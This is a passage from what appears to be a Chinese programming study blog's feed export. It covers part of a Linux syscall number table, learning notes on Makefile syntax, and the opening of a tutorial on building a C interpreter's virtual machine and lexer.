class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait_old         215</span></span><br><span class="line">__SYSCALL(__NR_epoll_wait_old, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_remap_file_pages           216</span></span><br><span class="line">__SYSCALL(__NR_remap_file_pages, sys_remap_file_pages)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getdents64             217</span></span><br><span class="line">__SYSCALL(__NR_getdents64, sys_getdents64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_tid_address            218</span></span><br><span class="line">__SYSCALL(__NR_set_tid_address, sys_set_tid_address)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_restart_syscall            219</span></span><br><span class="line">__SYSCALL(__NR_restart_syscall, sys_restart_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_semtimedop             220</span></span><br><span class="line">__SYSCALL(__NR_semtimedop, sys_semtimedop)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fadvise64              221</span></span><br><span class="line">__SYSCALL(__NR_fadvise64, sys_fadvise64)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_create           222</span></span><br><span class="line">__SYSCALL(__NR_timer_create, sys_timer_create)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_settime          223</span></span><br><span class="line">__SYSCALL(__NR_timer_settime, sys_timer_settime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_gettime          224</span></span><br><span class="line">__SYSCALL(__NR_timer_gettime, sys_timer_gettime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_getoverrun           225</span></span><br><span class="line">__SYSCALL(__NR_timer_getoverrun, sys_timer_getoverrun)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timer_delete           226</span></span><br><span class="line">__SYSCALL(__NR_timer_delete, sys_timer_delete)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_settime          227</span></span><br><span class="line">__SYSCALL(__NR_clock_settime, sys_clock_settime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_gettime          228</span></span><br><span class="line">__SYSCALL(__NR_clock_gettime, sys_clock_gettime)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_getres           229</span></span><br><span class="line">__SYSCALL(__NR_clock_getres, sys_clock_getres)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_clock_nanosleep            230</span></span><br><span class="line">__SYSCALL(__NR_clock_nanosleep, sys_clock_nanosleep)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_exit_group             231</span></span><br><span class="line">__SYSCALL(__NR_exit_group, sys_exit_group)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_wait             232</span></span><br><span class="line">__SYSCALL(__NR_epoll_wait, sys_epoll_wait)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_ctl              233</span></span><br><span class="line">__SYSCALL(__NR_epoll_ctl, sys_epoll_ctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tgkill             234</span></span><br><span class="line">__SYSCALL(__NR_tgkill, sys_tgkill)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimes             235</span></span><br><span class="line">__SYSCALL(__NR_utimes, sys_utimes)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vserver                236</span></span><br><span class="line">__SYSCALL(__NR_vserver, sys_ni_syscall)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mbind              237</span></span><br><span class="line">__SYSCALL(__NR_mbind, sys_mbind)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_mempolicy          238</span></span><br><span class="line">__SYSCALL(__NR_set_mempolicy, sys_set_mempolicy)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_mempolicy          239</span></span><br><span class="line">__SYSCALL(__NR_get_mempolicy, sys_get_mempolicy)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_open                240</span></span><br><span class="line">__SYSCALL(__NR_mq_open, sys_mq_open)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_unlink              241</span></span><br><span class="line">__SYSCALL(__NR_mq_unlink, sys_mq_unlink)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedsend           242</span></span><br><span class="line">__SYSCALL(__NR_mq_timedsend, sys_mq_timedsend)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_timedreceive            243</span></span><br><span class="line">__SYSCALL(__NR_mq_timedreceive, sys_mq_timedreceive)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_notify              244</span></span><br><span class="line">__SYSCALL(__NR_mq_notify, sys_mq_notify)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mq_getsetattr          245</span></span><br><span class="line">__SYSCALL(__NR_mq_getsetattr, sys_mq_getsetattr)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_kexec_load             246</span></span><br><span class="line">__SYSCALL(__NR_kexec_load, sys_kexec_load)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_waitid             247</span></span><br><span class="line">__SYSCALL(__NR_waitid, sys_waitid)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_add_key                248</span></span><br><span class="line">__SYSCALL(__NR_add_key, sys_add_key)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_request_key            249</span></span><br><span class="line">__SYSCALL(__NR_request_key, sys_request_key)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_keyctl             250</span></span><br><span class="line">__SYSCALL(__NR_keyctl, sys_keyctl)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_set             251</span></span><br><span class="line">__SYSCALL(__NR_ioprio_set, sys_ioprio_set)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ioprio_get             252</span></span><br><span class="line">__SYSCALL(__NR_ioprio_get, sys_ioprio_get)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_init           253</span></span><br><span class="line">__SYSCALL(__NR_inotify_init, sys_inotify_init)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_add_watch          254</span></span><br><span class="line">__SYSCALL(__NR_inotify_add_watch, sys_inotify_add_watch)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_inotify_rm_watch           255</span></span><br><span class="line">__SYSCALL(__NR_inotify_rm_watch, sys_inotify_rm_watch)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_migrate_pages          256</span></span><br><span class="line">__SYSCALL(__NR_migrate_pages, sys_migrate_pages)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_openat             257</span></span><br><span class="line">__SYSCALL(__NR_openat, sys_openat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mkdirat                258</span></span><br><span class="line">__SYSCALL(__NR_mkdirat, sys_mkdirat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_mknodat                259</span></span><br><span class="line">__SYSCALL(__NR_mknodat, sys_mknodat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchownat               260</span></span><br><span class="line">__SYSCALL(__NR_fchownat, sys_fchownat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_futimesat              261</span></span><br><span class="line">__SYSCALL(__NR_futimesat, sys_futimesat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_newfstatat             262</span></span><br><span class="line">__SYSCALL(__NR_newfstatat, sys_newfstatat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unlinkat               263</span></span><br><span class="line">__SYSCALL(__NR_unlinkat, sys_unlinkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_renameat               264</span></span><br><span class="line">__SYSCALL(__NR_renameat, sys_renameat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_linkat             265</span></span><br><span class="line">__SYSCALL(__NR_linkat, sys_linkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_symlinkat              266</span></span><br><span class="line">__SYSCALL(__NR_symlinkat, sys_symlinkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_readlinkat             267</span></span><br><span class="line">__SYSCALL(__NR_readlinkat, sys_readlinkat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fchmodat               268</span></span><br><span class="line">__SYSCALL(__NR_fchmodat, sys_fchmodat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_faccessat              269</span></span><br><span class="line">__SYSCALL(__NR_faccessat, sys_faccessat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_pselect6               270</span></span><br><span class="line">__SYSCALL(__NR_pselect6, sys_pselect6)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_ppoll              271</span></span><br><span class="line">__SYSCALL(__NR_ppoll,   sys_ppoll)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_unshare                272</span></span><br><span class="line">__SYSCALL(__NR_unshare, sys_unshare)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_set_robust_list            273</span></span><br><span class="line">__SYSCALL(__NR_set_robust_list, sys_set_robust_list)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_get_robust_list            274</span></span><br><span class="line">__SYSCALL(__NR_get_robust_list, sys_get_robust_list)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_splice             275</span></span><br><span class="line">__SYSCALL(__NR_splice, sys_splice)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_tee                276</span></span><br><span class="line">__SYSCALL(__NR_tee, sys_tee)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sync_file_range            277</span></span><br><span class="line">__SYSCALL(__NR_sync_file_range, sys_sync_file_range)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_vmsplice               278</span></span><br><span class="line">__SYSCALL(__NR_vmsplice, sys_vmsplice)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_move_pages             279</span></span><br><span class="line">__SYSCALL(__NR_move_pages, sys_move_pages)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_utimensat              280</span></span><br><span class="line">__SYSCALL(__NR_utimensat, sys_utimensat)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __IGNORE_getcpu     <span class="comment">/* implemented as a vsyscall */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_epoll_pwait            281</span></span><br><span class="line">__SYSCALL(__NR_epoll_pwait, sys_epoll_pwait)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_signalfd               282</span></span><br><span class="line">__SYSCALL(__NR_signalfd, sys_signalfd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_timerfd                283</span></span><br><span class="line">__SYSCALL(__NR_timerfd, sys_timerfd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_eventfd                284</span></span><br><span class="line">__SYSCALL(__NR_eventfd, sys_eventfd)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fallocate              285</span></span><br><span class="line">__SYSCALL(__NR_fallocate, sys_fallocate)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[文章学习] Makefile</title>
      <link href="/2021/05/15/Makefile/"/>
      <url>/2021/05/15/Makefile/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>学习链接：<a href="https://seisman.github.io/how-to-write-makefile/">https://seisman.github.io/how-to-write-makefile/</a></p><p>好久之前收藏的，今天就不用在收藏夹接着吃灰了(=ﾟωﾟ)=</p><h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><h2 id="makefile规则"><a href="#makefile规则" class="headerlink" title="makefile规则"></a>makefile规则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">target: prerequisites</span><br><span class="line">    command</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><blockquote><p>target是一个文件，也可以是一个标签</p><p>prerequisites是生成该target所依赖的文件和target</p><p>command是该target要执行的命令</p></blockquote><p>举个栗子：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    gcc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    gcc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    gcc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    gcc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    gcc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    gcc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    gcc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    gcc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    gcc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><ul><li>在该目录下直接输入命令<code>make</code>，就可以生成执行文件。如果要删除文件。只需要执行<code>make clean</code>。</li></ul><blockquote><p>执行make指令后，计算机会自动寻找文件中的第一个目标文件target，在上面的例子中，它找到了edit，并把它作为最终的目标文件。</p><p>如果edit所依赖的后面的文件不存在，则会执行后面定义的命令生成。</p></blockquote><ul><li><p>make后面想加参数，必须得在makefile文件里写上标签。</p></li><li><p>反斜杠<code>\</code>是换行符的意思</p></li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"><span class="comment"># 定义变量</span></span><br><span class="line"></span><br><span class="line">edit : <span class="variable">$(objects)</span></span><br><span class="line">    cc -o edit <span class="variable">$(objects)</span></span><br><span class="line"><span class="comment"># 调用变量</span></span><br></pre></td></tr></table></figure><h1 id="0x02-函数"><a href="#0x02-函数" class="headerlink" title="0x02 函数"></a>0x02 函数</h1><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>shell函数把执行操作系统命令后的输出作为函数返回</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常见操作</span></span><br><span class="line">contents := <span class="variable">$(<span class="built_in">shell</span> cat foo)</span></span><br><span class="line">files := <span class="variable">$(<span class="built_in">shell</span> echo *.c)</span></span><br></pre></td></tr></table></figure><h2 id="info"><a href="#info" class="headerlink" title="info"></a>info</h2><p>显示信息</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 常见操作</span></span><br><span class="line">$(info, <span class="string">&quot;here add the debug info&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>过滤函数：以 <code>&lt;pattern&gt;</code> 模式过滤 <code>&lt;text&gt;</code> 字符串中的单词，保留符合模式 <code>&lt;pattern&gt;</code> 的单词。可以有多个模式。返回符合模式 <code>&lt;pattern&gt;</code> 的字串</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(<span class="built_in">filter</span> &lt;pattern...&gt;,&lt;text&gt;)</span></span><br></pre></td></tr></table></figure><p>可以搭配ifeq或者ifneq使用</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果 TARGET 为A 或 B（即不为空），那么加入某些特殊参数</span></span><br><span class="line"><span class="comment"># 这里ifneq第二个参数为NULL</span></span><br><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(<span class="built_in">filter</span> A B , <span class="variable">$(TARGET)</span>)</span>,)</span><br><span class="line">   <span class="comment">#某些特殊参数</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><h2 id="error-amp-warning"><a href="#error-amp-warning" class="headerlink" title="error &amp; warning"></a>error &amp; warning</h2><p>两者都会输出警告信息，区别在于error会退出，但是warning不会退出。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$(<span class="built_in">error</span> &lt;text ...&gt;)</span></span><br><span class="line"><span class="variable">$(<span class="built_in">warning</span> &lt;text ...&gt;)</span></span><br></pre></td></tr></table></figure><h1 id="0x03-条件判断"><a href="#0x03-条件判断" class="headerlink" title="0x03 条件判断"></a>0x03 条件判断</h1><p>**ifneq(arg1, arg2)**：判断<code>arg1</code>和<code>arg2</code>的值是否相同，如果不同则为真</p><p>**ifeq (arg1, arg2)**：判断<code>arg1</code>和<code>arg2</code>的值是否相同，如果相同则为真</p><p>**ifdef(arg1)**：判断<code>arg1</code>的值是不是为空，如果是则为真</p><p><strong>endif</strong>：表示一个条件语句的结束，任何一个条件表达式都应该以 <code>endif</code> 结束。</p><h1 id="0x04-四个赋值号"><a href="#0x04-四个赋值号" class="headerlink" title="0x04 四个赋值号="></a>0x04 四个赋值号=</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">=  是最基本的赋值</span><br><span class="line">:= 是覆盖之前的值</span><br><span class="line">?= 是如果没有被赋值过就赋予等号后面的值</span><br><span class="line">+= 是添加等号后面的值</span><br></pre></td></tr></table></figure><p><code>=</code>和<code>:=</code>的区别：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = 123</span><br><span class="line">b = <span class="variable">$(a)</span>456</span><br><span class="line">a = 789</span><br><span class="line"><span class="comment"># b的值是789456</span></span><br><span class="line">a := 123</span><br><span class="line">b := <span class="variable">$(a)</span>456</span><br><span class="line">a := 789</span><br><span class="line"><span class="comment"># b的值是123456</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 2021年5月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[文章学习] 手把手教你(x)我(√)构建解释器</title>
      <link href="/2021/05/11/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0-x-%E6%88%91-%E2%88%9A-%E6%9E%84%E5%BB%BA%E7%BC%96%E8%AF%91%E5%99%A8/"/>
      <url>/2021/05/11/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0-x-%E6%88%91-%E2%88%9A-%E6%9E%84%E5%BB%BA%E7%BC%96%E8%AF%91%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>链接：<a href="https://lotabout.me/2015/write-a-C-interpreter-0/">https://lotabout.me/2015/write-a-C-interpreter-0/</a></p><p>copy的代码<a href="https://github.com/Kazamayc/Kazamayc-Compiler/blob/main/Kazamayc-Compiler.c">在这里</a>(看完语法分析后反而不想重写了，所以就删掉然后copy了一份)</p><p>首先，高考结束啦！(＾o＾)ﾉ</p><p>在看csapp第八章之前，打算先把之前收藏的文章跟着学一遍。一直看书太无聊了，csapp第七章大概随便就翻了翻，程序员的自我修养也没看完，感觉记忆不深，跟没学一样，所以换换脑子。</p><p>不过有一说一，这个教程做的很不错了，所以我大概也只是抄抄|ω・´)</p><p>本文的目的是让我这个啥也不懂的小白，也能理解编译器(x)解释器(√)的构成。所以我不了解的专业名词都会查阅后在下方标注，如果有错误，请大佬们指点我一下，球球了(つд⊂)</p><h1 id="0x01-设计"><a href="#0x01-设计" class="headerlink" title="0x01 设计"></a>0x01 设计</h1><p>首先，我们写的是个<strong>解释器</strong>而不是编译器，因为解释器需要我们实现自己的虚拟机与指令集，能让我们更好的学习。(ﾟ3ﾟ)</p><blockquote><p>解释器：不产生目标代码，直接执行</p><p>编译器：将源代码转换成目标代码然后执行</p></blockquote><p>构建过程：</p><ol><li>构建虚拟机以及指令集</li><li>构建词法分析器，用于将字符串转化成内部的表示结构。</li><li>构建语法分析器，将词法分析得到的标记流（token）生成一棵语法树。</li></ol><p>我们的编译器主要包括 4 个函数：</p><ol><li><code>next()</code> 用于词法分析，获取下一个标记，它将自动忽略空白字符。</li><li><code>program()</code> 语法分析的入口，分析整个 C 语言程序。</li><li><code>expression(level)</code> 用于解析一个表达式。</li><li><code>eval()</code> 虚拟机的入口，用于解释目标代码。</li></ol><h1 id="0x02-虚拟机"><a href="#0x02-虚拟机" class="headerlink" title="0x02 虚拟机"></a>0x02 虚拟机</h1><h2 id="计算机内部工作原理"><a href="#计算机内部工作原理" class="headerlink" title="计算机内部工作原理"></a>计算机内部工作原理</h2><p>计算机中有三个基本部件需要我们关注：CPU、寄存器和内存。代码以二进制的形式保存在内存中；CPU从中一条一条地加载指令执行；程序运行的状态保存在寄存器中。</p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>进程的内存会被分成几个段</p><ol><li>代码段(text)用于存放代码</li><li>数据段(data)用于存放初始化了的数据</li><li>未初始化数据段(bss)用于存放未初始化的数据</li><li>栈(stack)用于处理函数调用的相关数据</li><li>堆(heap)用于为程序动态分配内存</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">+------------------+</span><br><span class="line">|    stack   |     |      high address</span><br><span class="line">|    ...     v     |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|                  |</span><br><span class="line">|    ...     ^     |</span><br><span class="line">|    heap    |     |</span><br><span class="line">+------------------+</span><br><span class="line">| bss  segment     |</span><br><span class="line">+------------------+</span><br><span class="line">| data segment     |</span><br><span class="line">+------------------+</span><br><span class="line">| text segment     |      low address</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>我们的虚拟机只使用4个寄存器</p><ol><li><code>PC</code>程序计数器，存放一个内存地址，该地址存放下一条要执行的计算机指令。</li><li><code>SP</code>指针寄存器，永远指向当前栈顶。</li><li><code>BP</code>基址指针，指向栈的某些位置，在调用函数时会用到它。</li><li><code>AX</code>通用寄存器，它用于存放一条指令执行后的结果。</li></ol><h1 id="0x03-词法分析器"><a href="#0x03-词法分析器" class="headerlink" title="0x03 词法分析器"></a>0x03 词法分析器</h1><p>词法分析器用于对源码字符串做预处理，以减少语法分析器的复杂程度。词法分析器以源码字符串为输入，输出为标记流(token stream)。</p><p>每个标记通常包括：<code>(token, token value)</code>即标记本身和标记的值。例如，源码中若包含一个数字<code>&#39;998&#39;</code>，词法分析器将输出<code>(Number, 998)</code>，即（数字，998）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例如:</span></span><br><span class="line"><span class="number">2</span> + <span class="number">3</span> * (<span class="number">4</span> - <span class="number">5</span>)</span><br><span class="line">=&gt;</span><br><span class="line">(Number, <span class="number">2</span>) Add (Number, <span class="number">3</span>) Multiply Left-Bracket (Number, <span class="number">4</span>) Subtract (Number, <span class="number">5</span>) Right-Bracket</span><br></pre></td></tr></table></figure><p>我们可以理解为，直接从源代码编译成汇编代码是比较困难的，因为输入的字符串比较难处理。所以我们先编写一个词法分析器将字符串转换成标记流，然后再由编译器把标记流转换成汇编。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">                   +-------+                      +--------+</span><br><span class="line">-- source code --&gt; | lexer | --&gt; token stream --&gt; | parser | --&gt; assembly</span><br><span class="line">                   +-------+                      +--------+</span><br></pre></td></tr></table></figure><h2 id="词法分析器的实现"><a href="#词法分析器的实现" class="headerlink" title="词法分析器的实现"></a>词法分析器的实现</h2><p>我们不会一次性把所有源码转换成token stream，因为保存所有的token stream是没有意义且浪费空间的，并且字符串与代码的上下文是有关系的。</p><p>词法分析器会把扫描到的标识符(变量名的标识)全部保存到一张表中，遇到新的标识符就去查这张表，如果标识符已经存在，就返回它的唯一标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">identifier</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> token;<span class="comment">// 该标识符返回的标记</span></span><br><span class="line">    <span class="keyword">int</span> hash;<span class="comment">// 标识符的hash值，用于标识符的比较</span></span><br><span class="line">    <span class="keyword">char</span> * name;<span class="comment">// 存放标识符本身的字符串</span></span><br><span class="line">    <span class="keyword">int</span> <span class="class"><span class="keyword">class</span>;</span><span class="comment">// 标识符的类别，如数字，全局变量等</span></span><br><span class="line">    <span class="keyword">int</span> type;<span class="comment">// 标识符的类型，int，char等</span></span><br><span class="line">    <span class="keyword">int</span> value;<span class="comment">// 存放标识符的值，如果是标识符是函数，就存放函数的地址</span></span><br><span class="line">    <span class="keyword">int</span> Bclass;<span class="comment">//当全局变量和局部变量的标识符相同时，</span></span><br><span class="line">    <span class="keyword">int</span> Btype;<span class="comment">//B开头的保存全局标识符的信息</span></span><br><span class="line">    <span class="keyword">int</span> Bvalue;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后代码的主要就是通过分析来确定标记。对于关键字if,while,return等等，我们把它们加入符号表</p><ol><li>词法分析器的作用是对源码字符串进行预处理，作用是减小语法分析器的复杂程度。</li><li>词法分析器本身可以认为是一个编译器，输入是源码，输出是标记流。</li><li><code>lookahead(k)</code>的概念，即向前看<code>k</code>个字符或标记。</li><li>词法分析是怎么处理标识符与符号表的。</li></ol><p><strong>lookahead</strong>：如果有多个标记是以同样的字符开头的，凭借当前的字符我们无法确定具体解释成哪一个标记，所以我们只能向前查看字符判断解释的标记。</p><h1 id="0x04-语法分析器"><a href="#0x04-语法分析器" class="headerlink" title="0x04 语法分析器"></a>0x04 语法分析器</h1><h2 id="终结符与非终结符"><a href="#终结符与非终结符" class="headerlink" title="终结符与非终结符"></a>终结符与非终结符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;expr&gt; ::= &lt;expr&gt; + &lt;term&gt;</span><br><span class="line">         | &lt;expr&gt; - &lt;term&gt;</span><br><span class="line">         | 